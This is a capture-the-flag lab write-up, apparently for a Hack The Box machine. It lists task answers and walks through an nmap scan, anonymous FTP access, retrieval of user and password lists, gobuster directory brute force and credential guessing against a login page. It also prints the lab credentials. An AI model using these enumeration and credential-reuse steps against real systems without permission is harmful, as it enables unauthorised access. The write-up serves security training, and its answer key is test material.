## 1. Questions
- Task 1
	- What Nmap scanning switch employs the use of default scripts during a scan?
		- `-sC`
- Task 2
	- What service version is found to be running on port 21?
		- `vsftpd 3.0.3`
- Task 3
	- What FTP code is returned to us for the "Anonymous FTP login allowed" message?
		- `230`
- Task 4
	- After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?
		- `anonymous`
- Task 5
	- After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?
		- `get`
- Task 6
	- What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?
		- `admin`
- Task 7
	- What version of Apache HTTP Server is running on the target host?
		- `Apache httpd 2.4.41`
- Task 8
	- What switch can we use with Gobuster to specify we are looking for specific filetypes?
		- `-x`
- Task 9
	- Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?
		- `login.php`
- Submit Flag
	- Submit root flag
## 2. Tools Used
- Linux
- CLI
- nmap
- ftp
- lftp
- tnftp
- ls
- less
## 3. Approach
### nmap scan
- Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -T4 10.129.99.197
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-T4` - Use speed template `aggressive`.
- Result
```bash
<snip>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.85
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix
<snip>
```
### Research common usernames
- https://hackviser.com/tactics/pentesting/services/ftp#anonymous-authentication
- https://hackviser.com/tactics/pentesting/services/ftp#common-credentials
### Test ftp connection (passwordless)
- Useful resource
	- https://cheatsheet.haax.fr/network/services-enumeration/21_ftp/
	- https://lftp.yar.ru/lftp-man.html
	- https://www.mankier.com/1/tnftp
- Test usernames
	- `anonymous`
	- `admin`
	- `administrator`
	- `root`
	- `ftpuser`
	- `test`
- Successfully connected using username `anonymous`
```bash
ftp anonymous@10.129.99.197
lftp anonymous@10.129.99.197
tnftp anonymous@10.129.99.197
```
### Exploring files and directories
- From login directory
```bash
ls -al
```
- Result
```bash
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
```
### Review file contents
#### allowed.userlist
```bash
less allowed.userlist
```
- Result
```bash
aron
pwnmeow
egotisticalsw
admin
```
#### allowed.userlist.passwd
```bash
less allowed.userlist.passwd
```
- Result
```bash
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```
### Test webserver response
#### curl
- Useful resource
	- https://devhints.io/curl
```bash
curl -i 10.129.99.197
```
#### Browser
![](Screenshot%202025-09-13%20at%2018.52.50.png)
### Directory enumeration
- Useful resource
	- https://3os.org/penetration-testing/cheatsheets/gobuster-cheatsheet/
```bash
gobuster dir -u http://10.129.99.197 -w /opt/useful/seclists/Discovery/Web-Content/common.txt
```
- Key response element
```bash
<snip>
/dashboard            (Status: 301) [Size: 318] [--> http://10.129.99.197/dashboard/]
<snip>
```
### Test /dashboard directory response
- Redirected to `login.php`
![](Screenshot%202025-09-13%20at%2019.01.54.png)
### Test login with previously found credentials
- Credentials
	- Usernames
		- `aron`
		- `pwnmeow`
		- `egotisticalsw`
		- `admin`
	- Passwords
		- `root`
		- `Supersecretpassword1`
		- `Supersecretpassword1`
		- `rKXM59ESxesUFHAd`
- Successful login with username `admin` and password `rKXM59ESxesUFHAd`
### Retrieve the flag
- Presented upon login.
![](Screenshot%202025-09-13%20at%2019.09.52.png)
